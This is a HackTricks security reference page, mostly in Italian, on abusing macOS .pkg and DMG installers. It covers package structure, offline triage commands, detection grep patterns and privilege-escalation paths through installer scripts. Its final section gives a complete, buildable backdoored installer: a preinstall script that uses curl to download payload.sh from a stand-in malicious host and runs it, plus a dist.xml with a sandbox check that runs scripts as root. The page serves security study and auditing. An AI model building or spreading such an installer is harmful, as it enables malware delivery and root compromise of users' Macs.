# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Informazioni Base su Pkg

Un **installer package** di macOS (noto anche come file `.pkg`) è un formato di file usato da macOS per **distribuire software**. Questi file sono come una **scatola che contiene tutto ciò di cui un software ha bisogno** per installarsi e funzionare correttamente.

Il file package stesso è un archivio che contiene una **gerarchia di file e directory che verrà installata sul computer di destinazione**. Può anche includere **script** per eseguire attività prima e dopo l'installazione, come configurare file di configurazione o ripulire vecchie versioni del software.

### Hierarchy

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Personalizzazioni (titolo, testo di benvenuto…) e controlli di script/installazione
- **PackageInfo (xml)**: Informazioni, requisiti di installazione, percorso di installazione, percorsi degli script da eseguire
- **Bill of materials (bom)**: Elenco dei file da installare, aggiornare o rimuovere con i permessi dei file
- **Payload (CPIO archive gzip compressed)**: File da installare nella `install-location` da PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Script di pre e post installazione e altre risorse estratte in una directory temporanea per l'esecuzione.

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Per visualizzare il contenuto dell'installer senza decomprimerlo manualmente, puoi anche usare lo strumento gratuito [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Static triage shortcuts

Se l'obiettivo è l'analisi, prova a **evitare di aprire prima il package con `Installer.app`**. Alcuni package possono eseguire codice non appena Installer li apre (ad esempio tramite `system.run()` o plugin dell'installer), quindi l'estrazione offline è di solito il punto di partenza più sicuro.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## Informazioni di base su DMG

I file DMG, o Apple Disk Images, sono un formato di file usato da macOS di Apple per le immagini disco. Un file DMG è essenzialmente una **immagine disco montabile** (contiene il proprio filesystem) che contiene dati grezzi a blocchi, tipicamente compressi e talvolta cifrati. Quando apri un file DMG, macOS lo **monta come se fosse un disco fisico**, consentendoti di accedere al suo contenuto.

> [!CAUTION]
> Nota che gli installer **`.dmg`** supportano **così tanti formati** che in passato alcuni di quelli contenenti vulnerabilità sono stati abusati per ottenere **kernel code execution**.

### Gerarchia

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

La gerarchia di un file DMG può essere diversa in base al contenuto. Tuttavia, per i DMG di applicazioni, di solito segue questa struttura:

- Livello superiore: È la radice dell'immagine disco. Spesso contiene l'applicazione e possibilmente un link alla cartella Applications.
- Application (.app): Questa è l'applicazione vera e propria. In macOS, un'applicazione è tipicamente un pacchetto che contiene molti file e cartelle singoli che compongono l'applicazione.
- Applications Link: Questo è un collegamento alla cartella Applications in macOS. Lo scopo è rendere facile l'installazione dell'applicazione. Puoi trascinare il file .app su questo collegamento per installare l'app.

## Privesc via abuso di pkg

### Esecuzione da directory pubbliche

Se uno script di pre o post installazione viene, per esempio, eseguito da **`/var/tmp/Installerutil`**, e un attaccante può controllare quello script, può elevare i privilegi ogni volta che viene eseguito. Oppure un altro esempio simile:

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

Questa è una [funzione pubblica](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) che diversi installer e updater chiamano per **eseguire qualcosa come root**. Questa funzione accetta come parametro il **path** del **file** da **eseguire**; tuttavia, se un attaccante potesse **modificare** questo file, sarebbe in grado di **abusare** della sua esecuzione con root per **escalate privileges**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Per maggiori informazioni, guarda questo talk: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Abuso di Environment e shebang

I bug moderni di PackageKit hanno mostrato che gli script di installazione vengono spesso eseguiti come **trusted root code** mantenendo comunque vicino il contesto controllato dall'attaccante. Quando analizzi package del vendor, presta particolare attenzione a:

- Shell interpreters come `#!/bin/zsh` / `#!/bin/bash`
- Chiamate come `sudo -u $USER`, `launchctl asuser`, o qualsiasi logica che si fida di `$USER`, `$HOME`, `PATH`, `TMPDIR` o di relative paths
- Non-shell interpreters che possono caricare file di init o librerie controllati dall'utente
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Per il bug root-environment di PackageKit del 2024 (`~/.zshenv` / `~/.bash*` inheritance durante installazioni avviate dall’utente), controlla [the generic macOS privesc page](../macos-privilege-escalation.md). Se il package è **Apple-signed**, lo stesso bug di script può diventare **SIP/TCC-relevant** perché `system_installd` può ereditare `com.apple.rootless.install.heritable`; vedi [the SIP page](../macos-security-protections/macos-sip.md).

### Execution by mounting

Se un installer scrive in `/tmp/fixedname/bla/bla`, è possibile **creare un mount** sopra `/tmp/fixedname` con noowners così da poter **modificare qualsiasi file durante l’installazione** per abusare del processo di installazione.

Un esempio di questo è **CVE-2021-26089**, che è riuscito a **sovrascrivere uno script periodico** per ottenere esecuzione come root. Per maggiori informazioni dai un’occhiata al talk: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg as malware

### Empty Payload

È possibile generare semplicemente un file **`.pkg`** con **pre and post-install scripts** senza alcun payload reale, a parte il malware dentro gli script.

### JS in Distribution xml

È possibile aggiungere tag **`<script>`** nel file **distribution xml** del package e quel codice verrà eseguito e potrà **eseguire comandi** usando **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Nei distribution packages questo di solito dipende dal file `Distribution` di livello superiore che abilita gli script esterni, per esempio con `allow-external-scripts="true"`. Quindi controllare solo `preinstall` / `postinstall` non basta: il **Distribution XML** stesso può contenere hook `installation-check` / `volume-check` e percorsi diretti di esecuzione `system.run()` / `system.runOnce()`.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Installatore backdoorato

Installatore malevolo che usa uno script e codice JS dentro dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## Riferimenti

- [**DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws**](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [**OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [**DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [**CVE-2024-27822: macOS PackageKit Privilege Escalation**](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [**Breaking SIP with Apple-signed Packages**](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)

{{#include ../../../banners/hacktricks-training.md}}
